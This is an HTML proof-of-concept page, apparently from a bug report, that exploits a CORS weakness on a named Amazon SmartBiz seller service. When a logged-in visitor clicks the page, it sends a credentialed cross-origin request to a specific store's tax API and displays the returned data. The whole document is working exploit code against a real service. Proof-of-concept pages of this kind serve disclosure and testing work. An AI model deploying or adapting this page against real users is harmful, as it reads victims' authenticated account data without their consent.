<html>
  <head>
    <title>CORS PoC</title>
  </head>
  <body>
    <p>Click anywhere on this page to trigger the Cross-origin request.</p>
    <div id="response"></div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            document.onclick = () => {
                open('https://smartbiz.amazon.in/settings/gst-seller');

                fetch('https://smartbiz.amazon.in/api/stores/49411/tax', {
                        method: 'GET',
                        credentials: 'include',
                        mode: 'cors'
                    })
                    .then(response => response.json())
                    .then(data => {
                        alert(JSON.stringify(data));
                    })
                    .catch(error => {
                        console.log('Failed to issue Cross-origin request');
                    });
            }
        });
    </script>
</body>
</html>
